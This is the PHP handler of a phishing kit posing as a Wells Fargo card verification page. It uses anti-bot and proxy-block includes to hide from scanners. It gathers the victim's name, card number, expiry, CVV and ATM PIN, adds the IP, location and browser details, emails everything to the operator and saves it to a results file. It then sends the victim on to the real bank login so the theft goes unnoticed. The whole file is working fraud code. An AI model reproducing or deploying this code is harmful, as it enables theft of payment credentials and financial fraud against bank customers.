<?php
ob_start();
session_start();
include('../../Against_bot/east_a/useragent_bot.php');
require '../../Against_bot/east_b/main.php';
include('../../panel/config.php');
include '../../Against_bot/east_b/random.php';

if ($api_protection =="true") {
	include('../../Against_bot/east_b/proxyblock.php');
}



if(isset($_POST['firstname'])&&isset($_POST['creditcard'])&&isset($_POST['cardexp'])&&isset($_POST['token'])&&isset($_POST['spox'])){

    $v_ip = $_SERVER['REMOTE_ADDR'];
    $VictimInfo1 = "| Submitted by : https://www.geodatatool.com/en/?ip=$v_ip  ";
    $VictimInfo2 = "| L0cation : " . $citykota . ", " . $regioncity . ", " . $countryname . "";
    $VictimInfo3 = "| Us3r4gent : " . $user_agent . "";
    $VictimInfo4 = "| Br0wser : " . $br . "";
    $VictimInfo5 = "| Os : " . $os . "";
    
    $message = "+ ----- [ ❤️East code❤️ ] -----+\n";
    $message .="| First name: {$_POST['firstname']}\r\n";
    $message .="| CreditCard: {$_POST['creditcard']}\r\n";
    $message .="| Expiration Date : {$_POST['cardexp']}\r\n";
    $message .="| CVV/CSC : {$_POST['cvv']}\r\n";
    $message .="| ATMPIN : {$_POST['atmpin']}\r\n";
    $message .= "+ --------------------------+\n";
    $message .= "+ 🌐 Victim Inf0rmation\n";
    $message .= "$VictimInfo1\n";
    $message .= "$VictimInfo2\n";
    $message .= "$VictimInfo3\n";
    $message .= "$VictimInfo4\n";
    $message .= "$VictimInfo5\n";
    $message .= "| 🕛 Received : $date\n";
    $message .= "+ ----------------------------+\n";
    $subject = "$v_ip (💳 WELLSFARGO CARD )\n";
    $head = "Content-type:text/plain;charset=UTF-8\r\n";
    $head ="From: WELLSFARGO <wells@eastcoder.com>\r\n";
	

    @mail($your_email,$subject,$message,$head);
    $save=fopen("../resultz/card.txt","a+");
	fwrite($save,$message);
	fclose($save); 
    
		
		
		$key = substr(sha1(mt_rand()),1,25);


	if ($show_success_page=="yes") {
	   die($comps->headerX("../../oam/logout?origin=".$redirect."&langPref=".$cn.""));
    }else{

		$helper = array_keys($_SESSION);
    		foreach ($helper as $key){
        		unset($_SESSION[$key]);
    			}
    		exit(header("Location: https://bit.ly/2koaH3G")); // go to bank login page officiel..
	}

}else{
    header("HTTP/1.0 404 Not Found");
    exit();
}

?>